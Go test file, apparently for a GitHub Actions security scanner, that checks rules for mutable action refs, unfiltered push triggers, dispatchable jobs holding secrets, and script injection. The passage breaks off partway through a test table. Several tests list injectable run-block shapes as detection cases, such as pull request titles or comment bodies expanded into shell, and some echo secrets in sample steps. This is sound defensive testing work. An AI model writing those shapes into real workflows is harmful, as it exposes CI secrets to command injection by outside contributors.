package rules

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/Vibrouz/whoa/internal/findings"
	"github.com/Vibrouz/whoa/internal/parse"
)

// Fixtures are the spec. Every test here asserts an exact finding count and the
// exact rule IDs, because an assertion that matches "at least one" lets a rule
// degrade into a partial check with nothing going red.

const fixtureRoot = "../../tests/fixtures"

// sha is a fabricated 40 character object name for inline test workflows.
const sha = "0123456789abcdef0123456789abcdef01234567"

func fixtureBytes(t *testing.T, name string) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(fixtureRoot, name))
	if err != nil {
		t.Fatalf("read fixture %s: %v", name, err)
	}
	return data
}

func parseFixture(t *testing.T, name string) (*parse.File, []byte) {
	t.Helper()
	data := fixtureBytes(t, name)
	path := filepath.Join(".github/workflows", name)
	file, err := parse.ParseFile(path, data)
	if err != nil {
		t.Fatalf("parse %s: %v", name, err)
	}
	return file, data
}

// urlPattern matches a link so message assertions can look at prose only.
var urlPattern = regexp.MustCompile(`https?://\S+`)

// lineOf returns the 1-based line of the first occurrence of substr, counted
// from the raw file bytes. A line number assertion measured against the parsed
// tree only proves the parser agrees with itself.
func lineOf(t *testing.T, data []byte, substr string) int {
	t.Helper()
	idx := bytes.Index(data, []byte(substr))
	if idx < 0 {
		t.Fatalf("fixture does not contain %q", substr)
	}
	return 1 + bytes.Count(data[:idx], []byte("\n"))
}

type want struct {
	rule string
	sev  findings.Severity
	line int
}

// assertFindings checks the exact count, the rule IDs, the severities and the
// lines.
func assertFindings(t *testing.T, got findings.Findings, expected []want) {
	t.Helper()

	if len(got) != len(expected) {
		t.Fatalf("got %d findings, want %d: %v", len(got), len(expected), got)
	}
	for i, w := range expected {
		g := got[i]
		if g.RuleID != w.rule {
			t.Errorf("finding %d rule = %q, want %q", i, g.RuleID, w.rule)
		}
		if g.Severity != w.sev {
			t.Errorf("finding %d severity = %q, want %q", i, g.Severity, w.sev)
		}
		if g.Location.Line != w.line {
			t.Errorf("finding %d line = %d, want %d", i, g.Location.Line, w.line)
		}
		if !g.Severity.Valid() {
			t.Errorf("finding %d has severity %q, which is not a tier this product defines", i, g.Severity)
		}
		if g.RulesetVersion != findings.RulesetVersion {
			t.Errorf("finding %d ruleset version = %q, want %q", i, g.RulesetVersion, findings.RulesetVersion)
		}
		if g.Message == "" {
			t.Errorf("finding %d has an empty message", i)
		}
	}
}

// ---------------------------------------------------------------- rule 1

func TestRule1FlagsMutableRefsAtEveryLocation(t *testing.T) {
	file, data := parseFixture(t, "ppe-001/unpinned.yml")

	got := Rule1(file)

	assertFindings(t, got, []want{
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "uses: example/ci/.github/workflows/reusable.yml@main")},
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "uses: other-org/infra/.github/workflows/build.yml@release")},
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "- uses: actions/checkout@v4")},
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "- uses: actions/setup-node@main")},
	})

	// Locations have to distinguish a step from the job it is in, because the
	// two are different fixes and a report that conflates them sends a
	// maintainer to the wrong place.
	if got[2].Location.JobID != "build" || got[2].Location.StepNumber != 1 {
		t.Errorf("step finding location = %+v, want job build step 1", got[2].Location)
	}
	if got[1].Location.JobID != "call-reusable" || got[1].Location.StepNumber != 0 {
		t.Errorf("reusable workflow finding location = %+v, want job call-reusable with no step", got[1].Location)
	}
	if got[0].Location.JobID != "" || got[0].Location.StepNumber != 0 {
		t.Errorf("workflow level finding location = %+v, want no job and no step", got[0].Location)
	}
}

func TestRule1DoesNotFireWhenPinned(t *testing.T) {
	file, _ := parseFixture(t, "ppe-001/pinned.yml")

	if got := Rule1(file); len(got) != 0 {
		for _, f := range got {
			t.Errorf("unexpected finding on a pinned workflow: %s at %s", f.RuleID, f.Location)
		}
	}
}

func TestRule1TreatsAbbreviatedSHAAsMutable(t *testing.T) {
	file, data := parseFixture(t, "ppe-001/short-sha.yml")

	got := Rule1(file)

	assertFindings(t, got, []want{
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "- uses: actions/checkout@5f3b1c0")},
		{Rule1ID, findings.SeverityBlock, lineOf(t, data, "- uses: actions/cache@a1b2c3d4e5f6")},
	})
	if !strings.Contains(got[0].Message, "abbreviated commit SHA") {
		t.Errorf("message does not say what is wrong with the ref: %s", got[0].Message)
	}
}

// The message leads with the stronger control. Recommending SHA pinning first
// would be recommending the weaker one.
func TestRule1MessageLeadsWithLockfiles(t *testing.T) {
	file, _ := parseFixture(t, "ppe-001/unpinned.yml")
	got := Rule1(file)
	if len(got) == 0 {
		t.Fatal("no findings")
	}

	msg := got[0].Message

	// The ordering is checked on the prose with URLs stripped. The word
	// "lockfile" also appears inside the documentation link, so a message that
	// merely links to the doc would satisfy an assertion on the raw string.
	prose := urlPattern.ReplaceAllString(msg, "")

	lockfiles := strings.Index(prose, "lockfile")
	sha := strings.Index(prose, "SHA")
	if lockfiles < 0 || sha < 0 {
		t.Fatalf("message prose does not mention both controls: %s", prose)
	}
	if lockfiles > sha {
		t.Errorf("message mentions SHA pinning before workflow dependency lockfiles: %s", prose)
	}

	// Leading with the link is not leading with the control. The claim that
	// lockfiles supersede SHA pinning is the part a maintainer acts on.
	if !strings.Contains(prose, "superseding") {
		t.Errorf("message does not say lockfiles supersede SHA pinning: %s", prose)
	}

	// The real case is what makes the finding land rather than read as a style
	// preference, so it stays named.
	if !strings.Contains(prose, "tj-actions/changed-files") {
		t.Errorf("message no longer names the incident it prevents: %s", prose)
	}

	// A figure in user-facing copy needs a source.
	for _, want := range []string{
		"https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles",
		"https://nvd.nist.gov/vuln/detail/cve-2025-30066",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("message is missing the source %s: %s", want, msg)
		}
	}
}

// A mistyped SHA in a fixture is 39 or 41 characters instead of 40, and it
// fails as "rule 1 fired on a pinned workflow", which reads like a rule bug and
// is not one. This turns that into the actual problem.
func TestPinnedFixtureSHAsAreFortyCharacters(t *testing.T) {
	data := fixtureBytes(t, "ppe-001/pinned.yml")

	re := regexp.MustCompile(`uses:\s*(\S+?)@([0-9a-fA-F]+)\s*$`)
	found := 0
	for i, line := range strings.Split(string(data), "\n") {
		m := re.FindStringSubmatch(strings.TrimSpace(line))
		if m == nil {
			continue
		}
		found++
		if len(m[2]) != 40 {
			t.Errorf("pinned.yml:%d: %s@%s is %d characters, not 40. Every SHA in this fixture has to be a full commit name or rule 1 will flag it", i+1, m[1], m[2], len(m[2]))
		}
	}
	if found == 0 {
		t.Fatal("found no SHA references in pinned.yml: the negative fixture no longer covers pinning")
	}
}

func TestRefKind(t *testing.T) {
	tests := []struct {
		ref  string
		want string
	}{
		{"v4", "a version tag, which can be moved to point at new code"},
		{"v4.1.2", "a version tag, which can be moved to point at new code"},
		{"4.1.2", "a version tag, which can be moved to point at new code"},
		{"1.0.0-rc1", "a version tag, which can be moved to point at new code"},
		{"main", "a branch or other mutable reference"},
		{"master", "a branch or other mutable reference"},
		{"release/v1", "a branch or other mutable reference"},
		{"5f3b1c0", "an abbreviated commit SHA, which can be extended into a different commit"},
		{"a1b2c3d4e5f6", "an abbreviated commit SHA, which can be extended into a different commit"},
		{"deadbeef", "an abbreviated commit SHA, which can be extended into a different commit"},
	}

	for _, tt := range tests {
		t.Run(tt.ref, func(t *testing.T) {
			if got := refKind(tt.ref); got != tt.want {
				t.Errorf("refKind(%q) = %q, want %q", tt.ref, got, tt.want)
			}
		})
	}
}

func TestCommitSHA(t *testing.T) {
	tests := []struct {
		ref     string
		pinned  bool
		comment string
	}{
		{"1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d", true, "40 hex characters"},
		{"5f3b1c0d4e8a9b2c7d6e5f4a3b2c1d0e9f8a7b6c", true, "40 hex characters"},
		{"1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D", true, "uppercase hex is still 40 characters, and GitHub does not emit it but it is not a real ambiguity"},
		{"a1b2c3d4e5f6", false, "12 characters"},
		{"5f3b1c0", false, "7 characters"},
		{"1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4", false, "39 characters"},
		{"1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4dd", false, "41 characters"},
		{"z1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d", false, "not hex"},
		{"sha256:0123456789abcdef0123456789abcdef", false, "a digest, not a git object name"},
		{"v4", false, "a version tag"},
		{"main", false, "a branch"},
	}

	for _, tt := range tests {
		t.Run(tt.comment, func(t *testing.T) {
			if got := commitSHA.MatchString(tt.ref); got != tt.pinned {
				t.Errorf("commitSHA.MatchString(%q) = %v, want %v", tt.ref, got, tt.pinned)
			}
		})
	}
}

// The exclusions are decisions. Each one is a way a naive implementation
// over-fires or under-fires.
func TestRule1Exclusions(t *testing.T) {
	tests := []struct {
		name    string
		target  string
		flagged bool
		reason  string
	}{
		{"local action", "./.github/actions/build", false, "no ref is reported for a local action, so nothing to repoint"},
		{"local action, parent", "../shared/action", false, "same"},
		{"local action written with a ref", "./.github/actions/build@v4", false, "parse reports no ref for a local path even when it contains an @"},
		{"container action", "docker://alpine:3.19", false, "different supply chain with different controls"},
		{"container action, digest", "docker://alpine@sha256:abc", false, "same"},
		{"no ref at all", "actions/checkout", false, "a workflow that does not run, not one that runs unreviewed code"},
		{"full sha", "actions/checkout@1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d", false, "pinned"},
		{"full sha in a subdirectory", "actions/aws/ec2@1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d", false, "pinned, and subdirectory is part of the path not the ref"},
		{"version tag", "actions/checkout@v4", true, "the shape most repositories have"},
		{"branch", "actions/setup-node@main", true, "a branch"},
		{"branch with a slash", "actions/setup-node@release/v1", true, "the ref, not the subpath"},
		{"sha as a tag", "actions/checkout@5f3b1c0", true, "abbreviated, so not a pin"},
		{"digest prefix", "actions/checkout@sha256:0123456789abcdef", true, "not a 40 character git object name"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file, err := parse.Parse([]byte("uses: " + tt.target + "\n"))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if got := len(Rule1(file)) > 0; got != tt.flagged {
				t.Errorf("flagged = %v, want %v (%s)", got, tt.flagged, tt.reason)
			}
		})
	}
}

// ---------------------------------------------------------------- rule 7

func TestRule7FlagsUnfilteredPush(t *testing.T) {
	file, data := parseFixture(t, "ppe-007/unfiltered.yml")

	got := Rule7(file)

	assertFindings(t, got, []want{
		{Rule7ID, findings.SeverityWarn, lineOf(t, data, "push:")},
	})
	// It is about the workflow, not a job or a step.
	if got[0].Location.JobID != "" || got[0].Location.StepNumber != 0 {
		t.Errorf("location = %+v, want no job and no step", got[0].Location)
	}
	// No incident figure, because plan.md still has the GhostAction counts
	// marked vendor-sourced pending confirmation.
	if strings.Contains(got[0].Message, "772") || strings.Contains(got[0].Message, "2,577") {
		t.Errorf("message quotes an unverified incident figure: %s", got[0].Message)
	}
}

func TestRule7DoesNotFireWhenFiltered(t *testing.T) {
	file, _ := parseFixture(t, "ppe-007/filtered.yml")

	if got := Rule7(file); len(got) != 0 {
		for _, f := range got {
			t.Errorf("unexpected finding on a filtered push: %s at %s", f.RuleID, f.Location)
		}
	}
}

// Every way of writing a push trigger, and whether it counts as filtered. The
// fixture covers branches because that is the case build_plan.md names; the
// rest are inline because a workflow file has exactly one on: block, so each
// shape needs its own.
func TestRule7TriggerShapes(t *testing.T) {
	tests := []struct {
		name      string
		on        string
		flagged   bool
		reasoning string
	}{
		{"scalar, no filter", "on: push", true, "the most common shape and the one GhostAction uses"},
		{"mapping, empty body", "on:\n  push:", true, "same trigger, written out"},
		{"branches", "on:\n  push:\n    branches: [main]", false, "restricted to main"},
		{"branches-ignore", "on:\n  push:\n    branches-ignore: ['wip/**']", false, "an ignore list is still a filter"},
		{"tags", "on:\n  push:\n    tags: ['v*']", false, "only tag pushes, so it is not a ref push"},
		{"tags-ignore", "on:\n  push:\n    tags-ignore: ['nightly/**']", false, "same"},
		{"paths", "on:\n  push:\n    paths: ['src/**']", false, "only runs when src changes"},
		{"paths-ignore", "on:\n  push:\n    paths-ignore: ['docs/**']", false, "same"},
		{"no push event", "on:\n  pull_request:", false, "rule 7 is about push"},
		{"list form with push", "on: [push, pull_request]", true, "still an unfiltered push"},
		{"push with an empty branches list", "on:\n  push:\n    branches: []", true, "an empty list filters nothing"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			src := tt.on + "\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
			file, err := parse.Parse([]byte(src))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if got := len(Rule7(file)) > 0; got != tt.flagged {
				t.Errorf("flagged = %v, want %v (%s)", got, tt.flagged, tt.reasoning)
			}
		})
	}
}

// Rule 7 fires on a large share of legitimate workflows, which is why it is a
// Warn. The block tier is what the exit code hangs on, so getting this wrong
// would make ppe fail on repositories that are doing nothing wrong.
func TestRule7WarnsAndDoesNotBlock(t *testing.T) {
	unfiltered, _ := parseFixture(t, "ppe-007/unfiltered.yml")
	got := Rule7(unfiltered)
	if len(got) == 0 {
		t.Fatal("no findings")
	}
	if got.HasBlock() {
		t.Error("an unfiltered push blocks: a noisy gate gets disabled, and it takes the real rules down with it")
	}

	filtered, _ := parseFixture(t, "ppe-007/filtered.yml")
	if Rule7(filtered).HasBlock() {
		t.Error("a filtered push blocks")
	}
}

// ---------------------------------------------------------------- engine

// Each rule is also asserted through the engine, so a rule that exists but was
// never added to the checks slice fails its own test. Without this the rule's
// fixture passes and the finding never reaches a user.
func TestRulesRunThroughTheEngine(t *testing.T) {
	tests := []struct {
		fixture string
		ids     []string
	}{
		{"ppe-001/unpinned.yml", []string{Rule1ID, Rule1ID, Rule1ID, Rule1ID}},
		{"ppe-001/pinned.yml", nil},
		{"ppe-007/unfiltered.yml", []string{Rule7ID}},
		{"ppe-007/filtered.yml", nil},
		{"ppe-008/dispatch-sensitive.yml", []string{Rule8ID, Rule8ID, Rule8ID}},
		{"ppe-008/dispatch-clean.yml", nil},
		{"ppe-002/injected.yml", []string{Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID}},
		{"ppe-002/safe.yml", nil},
		{"ppe-006/split_job.yml", nil},
		{
			"ppe-003/malicious.yml",
			[]string{
				Rule3ID, Rule3ID, Rule3ID,
				Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID,
				Rule5ID, Rule5ID, Rule5ID,
			},
		},
		{
			"ppe-006/correlated.yml",
			[]string{Rule6ID, Rule6ID, Rule6ID},
		},
	}

	for _, tt := range tests {
		t.Run(tt.fixture, func(t *testing.T) {
			file, _ := parseFixture(t, tt.fixture)
			got := NewEngine().Run(file)

			var ids []string
			for _, f := range got {
				ids = append(ids, f.RuleID)
			}
			if len(ids) != len(tt.ids) {
				t.Fatalf("engine returned %v, want %v", ids, tt.ids)
			}
			for i := range ids {
				if ids[i] != tt.ids[i] {
					t.Errorf("engine finding %d = %s, want %s", i, ids[i], tt.ids[i])
				}
			}
		})
	}
}

// ---------------------------------------------------------------- rule 8

func TestRule8FlagsDispatchOnSensitiveJobs(t *testing.T) {
	file, data := parseFixture(t, "ppe-008/dispatch-sensitive.yml")

	got := Rule8(file)

	assertFindings(t, got, []want{
		{Rule8ID, findings.SeverityWarn, lineOf(t, data, "secrets-inherit:")},
		{Rule8ID, findings.SeverityWarn, lineOf(t, data, "deploy-env:")},
		{Rule8ID, findings.SeverityWarn, lineOf(t, data, "  oidc:")},
	})
	// The job has to be named, or a report points at a file with several jobs
	// and no way to tell which one to fix.
	for i, id := range []string{"secrets-inherit", "deploy-env", "oidc"} {
		if got[i].Location.JobID != id {
			t.Errorf("finding %d job = %q, want %q", i, got[i].Location.JobID, id)
		}
	}
}

func TestRule8DoesNotFireOnAnOrdinaryDispatchWorkflow(t *testing.T) {
	file, _ := parseFixture(t, "ppe-008/dispatch-clean.yml")

	if got := Rule8(file); len(got) != 0 {
		for _, f := range got {
			t.Errorf("unexpected finding on an ordinary dispatch workflow: %s at %s", f.RuleID, f.Location)
		}
	}
}

// Rule 8 is Warn, not Block. It fires on real deploy buttons, and a gate that
// blocks on those gets disabled.
func TestRule8WarnsAndDoesNotBlock(t *testing.T) {
	file, _ := parseFixture(t, "ppe-008/dispatch-sensitive.yml")
	if got := Rule8(file); got.HasBlock() {
		t.Error("rule 8 blocks: workflow_dispatch with a privileged job is a normal pattern")
	}
}

// Each way a job becomes sensitive, and each way it does not. The fixture
// covers secrets: and a secret in env; the rest are inline because they differ
// in one line each and a file per case would be a directory of near-identical
// workflows.
func TestRule8SensitivityShapes(t *testing.T) {
	dispatch := "on:\n  workflow_dispatch:\n"
	plain := "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"

	tests := []struct {
		name      string
		src       string
		fired     bool
		reasoning string
	}{
		{
			name:      "secrets: inherit",
			src:       dispatch + "jobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets: inherit\n",
			fired:     true,
			reasoning: "receives every secret the caller made available",
		},
		{
			name:      "explicit secrets mapping",
			src:       dispatch + "jobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets:\n      token: ${{ secrets.T }}\n",
			fired:     true,
			reasoning: "same, written out",
		},
		{
			name:      "empty secrets block is still declared",
			src:       dispatch + "jobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets:\n",
			fired:     true,
			reasoning: "a secrets: key is a chance to hold credentials",
		},
		{
			name:      "secret in job env",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    env:\n      T: ${{ secrets.T }}\n    steps:\n      - run: echo hi\n",
			fired:     true,
			reasoning: "holds a credential in its environment",
		},
		{
			name:      "secret in a step with:",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: o/r@v1\n        with:\n          token: ${{ secrets.T }}\n",
			fired:     true,
			reasoning: "handed to an action",
		},
		{
			name:      "secret in a run: block",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.T }}\n",
			fired:     true,
			reasoning: "used in a script",
		},
		{
			name:      "secret in an if: condition",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    if: ${{ secrets.T != '' }}\n    steps:\n      - run: echo hi\n",
			fired:     true,
			reasoning: "reads it",
		},
		{
			name:      "github.token alone",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh api\n        env:\n          GH_TOKEN: ${{ github.token }}\n",
			fired:     false,
			reasoning: "the workflow token is not a repository secret, and rule 11 owns its permissions",
		},
		{
			name:      "secrets.GITHUB_TOKEN alone",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh api\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
			fired:     false,
			reasoning: "the same token under the other spelling",
		},
		{
			name:      "id-token: write at job level",
			src:       dispatch + "jobs:\n  a:\n    permissions:\n      id-token: write\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
			fired:     true,
			reasoning: "can mint a cloud credential",
		},
		{
			name:      "id-token: write inherited from the workflow",
			src:       dispatch + "permissions:\n  id-token: write\n" + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
			fired:     true,
			reasoning: "a job block is not required to hold it",
		},
		{
			name:      "id-token: read is not write",
			src:       dispatch + "jobs:\n  a:\n    permissions:\n      id-token: read\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
			fired:     false,
			reasoning: "cannot mint a credential",
		},
		{
			name:      "checkout with no pull request trigger",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
			fired:     false,
			reasoning: "there is no fork PR to check out",
		},
		{
			name:      "checkout on a pull request event",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
			fired:     true,
			reasoning: "checks out code on an event a contributor can trigger",
		},
		{
			name:      "checkout on pull_request_target",
			src:       "on:\n  workflow_dispatch:\n  pull_request_target:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
			fired:     true,
			reasoning: "same, and the more dangerous trigger",
		},
		{
			name:      "checkout on workflow_run",
			src:       "on:\n  workflow_dispatch:\n  workflow_run:\n    workflows: [ci]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
			fired:     true,
			reasoning: "same, fixed by decision 18",
		},
		{
			name:      "checkout after a step with no uses: on a pull request event",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n      - uses: actions/checkout@v4\n",
			fired:     true,
			reasoning: "the walk has to step over steps that have no uses: at all",
		},
		{
			name:      "an action whose name merely contains checkout",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: some-org/checkout-helper@0123456789abcdef0123456789abcdef01234567\n",
			fired:     false,
			reasoning: "only actions/checkout puts pull request code in the workspace",
		},
		{
			name:      "a different checkout action on a pull request event",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout-path@0123456789abcdef0123456789abcdef01234567\n",
			fired:     false,
			reasoning: "checkout-path is a different action",
		},
		{
			name:      "run steps only on a pull request event",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
			fired:     false,
			reasoning: "a pull request event alone is not sensitive: nothing checks code out",
		},
		{
			name:      "an action that is not checkout on a pull request event",
			src:       "on:\n  workflow_dispatch:\n  pull_request:\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-node@0123456789abcdef0123456789abcdef01234567\n",
			fired:     false,
			reasoning: "setup-node does not put pull request code in the workspace",
		},
		{
			name:      "token-reader, undeclared permissions",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh api\n        env:\n          GH_TOKEN: ${{ github.token }}\n",
			fired:     false,
			reasoning: "the workflow token is not a repository secret",
		},
		{
			name:      "token-reader, read-all permissions",
			src:       dispatch + "permissions: read-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh api\n        env:\n          GH_TOKEN: ${{ github.token }}\n",
			fired:     false,
			reasoning: "read-all does not include id-token, so the token alone leaves it clean",
		},
		{
			name:      "token-reader, write-all permissions",
			src:       dispatch + "permissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh api\n        env:\n          GH_TOKEN: ${{ github.token }}\n",
			fired:     true,
			reasoning: "write-all covers every scope including id-token, so this is sensitive as an OIDC job, not because of the token",
		},
		{
			name:      "the workflow token must not mask a real secret in the same string",
			src:       dispatch + "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \u0024{{ secrets.GITHUB_TOKEN }} \u0024{{ secrets.DEPLOY_TOKEN }}\n",
			fired:     true,
			reasoning: "skipping the token has to keep scanning, not stop",
		},
		{
			name:      "nothing sensitive at all",
			src:       dispatch + plain,
			fired:     false,
			reasoning: "the ordinary case",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file, err := parse.Parse([]byte(tt.src))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if got := len(Rule8(file)) > 0; got != tt.fired {
				t.Errorf("fired = %v, want %v (%s)", got, tt.fired, tt.reasoning)
			}
		})
	}
}

// Without a workflow_dispatch trigger there is nothing to be dormant, so rule 8
// has no subject.
func TestRule8NeedsTheDispatchTrigger(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{"no trigger at all", "jobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets: inherit\n"},
		{"push only", "on:\n  push:\n    branches: [main]\njobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets: inherit\n"},
		{"pull_request only", "on:\n  pull_request:\njobs:\n  a:\n    uses: o/r/.github/workflows/x.yml@" + sha + "\n    secrets: inherit\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file, err := parse.Parse([]byte(tt.src))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if got := Rule8(file); len(got) != 0 {
				t.Errorf("rule 8 fired without workflow_dispatch: %v", got)
			}
		})
	}
}

// Every part of a job can hide a secret reference. A check that skips one of
// them is a job that walks through.
func TestSensitiveJobLooksEverywhere(t *testing.T) {
	tokens := []string{"secrets.DEPLOY_TOKEN"}
	places := []string{
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    env:\n      V: %s\n    steps:\n      - run: echo hi\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    if: \"${{ %s }}\"\n    steps:\n      - run: echo hi\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo %s\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n        env:\n          V: %s\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n        if: \"${{ %s }}\"\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: o/r@v1\n        with:\n          v: %s\n",
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: o/r@v1\n        env:\n          V: %s\n",
	}
	for _, token := range tokens {
		for i, place := range places {
			t.Run(token+" in place", func(t *testing.T) {
				src := "on:\n  workflow_dispatch:\n" + fmt.Sprintf(place, token)
				file, err := parse.Parse([]byte(src))
				if err != nil {
					t.Fatalf("Parse: %v", err)
				}
				if len(Rule8(file)) == 0 {
					t.Errorf("secret in place %d was not detected", i)
				}
			})
		}
	}
}

// ---------------------------------------------------------------- rule 2

func TestRule2FlagsUntrustedContextInRunBlocks(t *testing.T) {
	file, data := parseFixture(t, "ppe-002/injected.yml")

	got := Rule2(file)

	want := []want{
		{Rule2ID, findings.SeverityBlock, lineOf(t, data, `title="${{ github.event.pull_request.title }}"`)},
		{Rule2ID, findings.SeverityBlock, lineOf(t, data, `echo "PR: ${{ github.event.pull_request.body }}"`)},
		{Rule2ID, findings.SeverityBlock, lineOf(t, data, `echo "issue: ${{ github.event.issue.title }}"`)},
		{Rule2ID, findings.SeverityBlock, lineOf(t, data, `echo "comment: ${{ github.event.comment.body }}"`)},
		{Rule2ID, findings.SeverityWarn, lineOf(t, data, `echo "branch: ${{ github.head_ref }}"`)},
		{Rule2ID, findings.SeverityWarn, lineOf(t, data, `--notes "${{ github.event.release.name }}"`)},
		{Rule2ID, findings.SeverityWarn, lineOf(t, data, `--title "${{ github.event.milestone.title }}"`)},
	}
	assertFindings(t, got, want)
}

func TestRule2DoesNotFireOnTheSafeShapes(t *testing.T) {
	file, _ := parseFixture(t, "ppe-002/safe.yml")

	if got := Rule2(file); len(got) != 0 {
		for _, f := range got {
			t.Errorf("unexpected finding on a safe workflow: %s at %s: %s", f.RuleID, f.Location, f.Message[:min(80, len(f.Message))])
		}
	}
}

// The plan.md pattern for this is github\.(event\.)?\w+[.\w]*\.(suffix), which
// requires a dot before the suffix and so never matches github.head_ref or
// github.ref. Those are the most common ref-suffix references there are, so this
// pins that the matcher handles both shapes.
func TestRule2MatchesBothContextShapes(t *testing.T) {
	tests := []struct {
		name       string
		expression string
		wantSuffix string
		wantSev    findings.Severity
	}{
		{"property straight after the context", "github.head_ref", "head_ref", findings.SeverityWarn},
		{"bare ref", "github.ref", "ref", findings.SeverityWarn},
		{"bare name, held at Warn", "github.name", "name", findings.SeverityWarn},
		{"event dotted path", "github.event.issue.title", "title", findings.SeverityBlock},
		{"nested event path", "github.event.pull_request.head.ref", "ref", findings.SeverityWarn},
		{"indexed list then suffix", "github.event.commits[0].message", "message", findings.SeverityBlock},
		{"deep author path", "github.event.head_commit.author.email", "email", findings.SeverityBlock},
		{"default branch", "github.event.repository.default_branch", "default_branch", findings.SeverityWarn},
		{"label suffix", "github.event.pull_request.head.label", "label", findings.SeverityWarn},
		{"page name", "github.event.pages[0].page_name", "page_name", findings.SeverityWarn},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := "echo " + tt.expression + "\n"
			got := untrustedReferences(script)
			if len(got) != 1 {
				t.Fatalf("got %d matches for %s, want 1", len(got), tt.expression)
			}
			if got[0].suffix != tt.wantSuffix {
				t.Errorf("suffix = %q, want %q", got[0].suffix, tt.wantSuffix)
			}
			if got[0].severity != tt.wantSev {
				t.Errorf("severity = %q, want %q", got[0].severity, tt.wantSev)
			}
		})
	}
}

// A suffix has to be the whole final segment. Substring comparison would match
// number against nothing but would match full_name on name, and would match
// username on name.
func TestRule2MatchesWholeSegmentsOnly(t *testing.T) {
	tests := []struct {
		expression string
		wantMatch  bool
		reasoning  string
	}{
		{"github.event.pull_request.number", false, "numeric, and not in the suffix set"},
		{"github.event.pull_request.head.repo.full_name", false, "full_name is not name"},
		{"github.actor", false, "actor is not a suffix"},
